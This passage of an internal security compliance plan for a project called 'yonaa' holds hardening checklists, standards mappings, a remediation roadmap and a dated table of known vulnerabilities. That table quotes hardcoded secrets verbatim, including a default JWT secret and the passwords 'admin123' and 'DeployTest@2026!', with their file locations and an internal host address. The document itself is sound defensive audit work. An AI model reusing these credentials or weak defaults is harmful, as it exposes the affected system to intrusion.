[ ] 1. 生产关闭 debug (FLASK_DEBUG=false, FLASK_ENV=production)
[ ] 2. 500 错误统一响应: {"error": "internal_error", "trace_id": "uuid"}, 不含 stack trace
[ ] 3. shell 脚本 set -euo pipefail
[ ] 4. Python 自定义全局 ErrorHandler
[ ] 5. 错误监控: Sentry / 自建 syslog (带 trace_id)
```

### 7.10 L17 速率限制与 DDoS

**对应标准**: OWASP A04:2021 / CIS 13

**当前缺口**:
- `/api/exec` 已有限速 (20 req/s), 但其他端口 (9200/9201/9202/9203/9204/9206) 未核实

```
[ ] 1. 单 IP: 60 req/min 软限 + 120 req/min 硬限
[ ] 2. 单端点: admin 操作 10 req/min
[ ] 3. Payload 大小: GET < 4KB, POST < 100MB
[ ] 4. Slowloris: 头部超时 10s, 整体超时 60s
[ ] 5. 暴力破解检测: 5 次密码错 → 临时 IP 封禁 (15min)
[ ] 6. 反爬 / anti-burst: token bucket
```

### 7.11 L18 备份与恢复

**对应标准**: 等保 2.0 8.1.9 / ISO 27001 A.12.3 / GDPR Art.32(1)(c)

**当前状态**: 备份脚本存在 (`/opt/app/deployments/backup_*`), 但**未审**
```
[ ] 1. 3-2-1 策略: 3 副本 / 2 种介质 / 1 份异地
[ ] 2. 数据库: 每日全量 + 1h 增量, WAL 归档
[ ] 3. 备份加密 (AES-256-GCM, 密钥独立管理)
[ ] 4. 备份文件无密码明文
[ ] 5. 季度恢复演练 (实测 restore 时间 < 4h)
[ ] 6. 备份完整性验证 (checksum + 抽样恢复)
[ ] 7. 备份访问审计 (who/when/read/write/delete)
```

### 7.12 L19 漏洞披露 / 供应链安全

**对应标准**: NIST SC-8 / ISO 27001 A.15 / GDPR Art.32(1)(d)

```
[ ] 1. SBOM (CycloneDX / SPDX) 自动生成并归档
[ ] 2. 第三方镜像签名校验 (cosign / gpg / sha256)
[ ] 3. 内核 / 基础镜像定期更新 (每月 minor, 每季 major)
[ ] 4. CVE 跟踪: 订阅 NVD / GitHub Security Advisory
[ ] 5. 应急流程: 关键 CVE → 24h 内评估 → 7d 内修复
[ ] 6. 软件采购清单 + 软件授权合规
```

### 7.13 L20 DevSecOps / CI 安全门禁

**对应标准**: CIS 16 / NIST SI-2 / SOC 2 CC8

**当前项目**: 已有 pre-commit 钩子, 但**未必覆盖 SAST/secrets**
```
[ ] 1. pre-commit 钩子 (必须, 强制):
       - detect-secrets (扫描密码/token 提交)
       - bandit (Python SAST)
       - shellcheck (Bash SAST)
       - hadolint (Dockerfile)
       - prettier --check
       - 禁止任何 .env 文件提交
[ ] 2. CI 步骤 (在 PR 触发):
       - pip-audit (SCA)
       - bandit --recursive (SAST)
       - shellcheck **/*.sh
       - trivy image:severity HIGH,CRITICAL
       - gitleaks (secrets 历史)
[ ] 3. 受保护分支: main/master 不允许 force-push
[ ] 4. Code Owner Review: 关键模块需审批
[ ] 5. 签名提交: GPG signed commits
```

---

## 八、合规已知漏洞清单 (2026-07-14 排查)

| # | Lx | 位置 | 漏洞 | 严重度 | 修复方案 |
|---|---|---|---|---|---|
| 1 | L8 | `deploy_bundle/tools/deploy_step.sh:27` | `JWT_SECRET=v20260702-deploy-key-2026-07-03-do-not-use-in-prod` 明文 default | **P0** | 用 `${JWT_SECRET:?error}` 强制, secrets.token_urlsafe(48) 注入 |
| 2 | L9 | `deploy_bundle/meta/services/auth_provider.py:22` | PBKDF2 iter=100k < OWASP 600k | **P0** | 改 Argon2id 或升到 600k |
| 3 | L9 | `deploy_bundle/meta/services/auth_provider.py:49-50` | SHA256 无 salt 密码哈希 (legacy) | **P0** | 强制 upgrade, 旧 hash 首次登录 rehash |
| 4 | L10 | `deploy_bundle/tools/remote_monitor.ps1:14` | `[string]$AdminPass = "admin123"` 弱默认 | **P0** | 改 Get-Credential + 强密码策略 |
| 5 | L10 | `deploy_bundle/tools/deploy.sh:567` | `DeployTest@2026!` 硬编码 | **P1** | 用 env 变量或 vault |
| 6 | L10 | `deploy_bundle/tools/deploy.sh:660,896` | `admin/admin123` 硬编码 fallback | **P1** | 改环境变量或 read-from-file |
| 7 | L11 | 全 HTTP 自签证书 | TLS 缺失 | **P0** | 部署内网 PKI, mTLS between services |
| 8 | L12 | `deploy_bundle/deploy.sh:154,419` | CORS 用 hostname -I 不固定 | **P2** | 改成具体 IP 白名单 |
| 9 | L13 | `deploy_bundle/meta/core/sql_adapters.py:1137` | 必须确认全部用占位符 | **P1** | bandit 安全扫描 |
| 10 | L14 | 全项目 | 无 SCA / SBOM | **P1** | 加 pip-audit + cyclonedx |
| 11 | L15 | `deploy_bundle/` 日志全在 app 目录 | 日志可被应用篡改 | **P1** | 走 rsyslog → 远端审计服务器 |
| 12 | L16 | `deploy_bundle/lib/common.sh:30` | `# set -e` 注释掉 | **P0** | 改 `set -euo pipefail` |
| 13 | L17 | 9200/9201/9202/9203/9204/9206 | 限流未核实 | **P0** | 各端点加限流 |
| 14 | L18 | 备份脚本 | 含密码明文 + 未审 | **P1** | 排查所有 backup_*.sh |
| 15 | L20 | `.pre-commit-config.yaml` | 未必覆盖 bandit/shellcheck/detect-secrets | **P1** | 加全套 hooks |

---

## 九、合规对标到 yonaa 项目

### 9.1 等保 2.0 三级 (强制, 国内合规)

| 条款 | 要求 | 当前覆盖 | 缺口 |
|---|---|---|---|
| 8.1.4 密码应用 | 商用密码 + 强认证 | ⚠️ 部分 (JWT + PBKDF2) | L8 L9 L10 |
| 8.1.5 访问控制 | RBAC + 最小权限 | ⚠️ admin token 通杀 | L10 |
| 8.1.6 安全审计 | 操作日志 + 保护 | ❌ 日志可篡改 | L15 |
| 8.1.7 入侵防范 | 漏洞修复 + 配置 | ❌ 无 SCA | L14 L20 |
| 8.1.9 备份恢复 | 3-2-1 策略 | ⚠️ 备份存在 | L18 |
| 8.1.10 监测预警 | 集中监测 | ❌ 未集成 SIEM/告警 | L17 |
| 8.1.11 应急预案 | 响应流程 | ⚠️ runbook 存在, 无演练 | 流程 |

### 9.2 OWASP Top 10 2021 + 项目覆盖

| OWASP | Lx | 覆盖 |
|---|---|---|
| A01 访问控制破坏 | L10 | ⚠️ 单 token 通杀 |
| A02 加密失败 | L8 L9 L11 | ❌ 多处明文密钥 + 无 TLS |
| A03 注入 | L13 | ⚠️ SQL 占位符, 需 bandit |
| A04 不安全设计 | L17 | ⚠️ 限流局部 |
| A05 配置错误 | L4 L11 L12 | ⚠️ CORS / TLS |
| A06 漏洞组件 | L14 | ❌ 无 SCA |
| A07 认证失败 | L10 | ⚠️ 弱默认密码 |
| A08 数据完整性 | L13 | ⚠️ MD5 弱校验 |
| A09 日志失败 | L15 L16 | ❌ 日志不脱敏 |
| A10 SSRF | L13 | ⚠️ 部分 |

### 9.3 GDPR / PIPL 数据保护

| 条款 | 要求 | 项目状态 |
|---|---|---|
| GDPR Art.32 | 加密 + 完整性 + 可恢复 | ⚠️ 部分 (TLS 缺失) |
| PIPL 第 51 条 | 境内存储 + 安全 | ⚠️ 需评估数据流向 |
| PIPL 第 52 条 | 数据保护影响评估 | ❌ 无 PIA 文档 |

---

## 十、V4 迁移路径 (合规专项)

### Phase A. 立即 (本周 P0)

- [ ] **L9/P0**: PBKDF2 100k → 600k 或换 Argon2id
- [ ] **L9/P0**: SHA256 无 salt 旧 hash → 强制升级
- [ ] **L8/P0**: JWT_SECRET 删 default fallback
- [ ] **L10/P0**: 全部 admin/admin123 fallback 改 env + 强密码
- [ ] **L16/P0**: `# set -e` 取消注释, 所有 lib/common.sh
- [ ] **L17/P0**: 9200/9201/9202/9203/9204/9206 加 rate_limit
- [ ] **L11/P0**: 评估部署内网 PKI 时间表

### Phase B. 本月 (P1)

- [ ] **L14/P1**: 加 pip-audit 到 CI, 生成 SBOM
- [ ] **L15/P1**: 日志走 rsyslog → 独立审计服务器
- [ ] **L18/P1**: 备份脚本脱敏 + 季度恢复演练
- [ ] **L13/P1**: bandit 全项目扫描, 改 SQLi 风险

### Phase C. 季度 (P2)

- [ ] **L20/P2**: 全套 pre-commit hooks + CI 流水线
- [ ] **L12/P2**: 严格 CORS 白名单 + CSRF token
- [ ] **L19/P2**: SBOM + cosign 镜像签名 + CVE 跟踪
- [ ] **L15/P2**: WORM 存储 + 1 年留存

---

## 六、CHANGELOG

| 日期 | 版本 | 变更 |
|---|---|---|
| 2026-07-14 AM | V1 | 初版: "127.0.0.1 HTTP 自我调用" 事故, 3 大铁律 + 简化决策树 + 9 项过度设计排查 |
| 2026-07-14 AM | V2 | 集团内网安全检查: 新增 4 条安全规范 (L4-L7), 8 处 0.0.0.0 绑定审计 + 5 处 bash 解密模式审查 + 4 个端口缺防护清单 + 6 类密码留痕问题 |
| 2026-07-14 PM | V3 | **关键事实修正**: yonaa (172.20.59.7) **无 SSH** 暴露给 agent. L2 改写, 简化决策树改写, 所有 SSH/paramiko/sshpass 例子全部改为 HTTP+token+明文 SFTP (走 /api/upload + /api/exec). 审计重新评估: 现有 monitor_prod.py + _remote_*.py 用 HTTP+base64 触发告警, 修法保留 HTTP 改明文. |
| 2026-07-14 PM | V4 | **合规全量升级**

---

(详细章节见七至十): 基于等保 2.0 / CIS Controls v8 / OWASP Top 10 2021 / NIST CSF / SOC 2 / ISO 27001 / GDPR / PIPL, 新增 **L8-L20 共 13 个安全门禁** (强加密 / 密码哈希 / 认证分层 / TLS / CORS / 输入验证 / 依赖扫描 / 日志审计 / 错误脱敏 / 限流 / 备份 / 漏洞披露 / CI 门禁). 同步排查项目已有漏洞, 见 `六、合规已知漏洞清单`. |
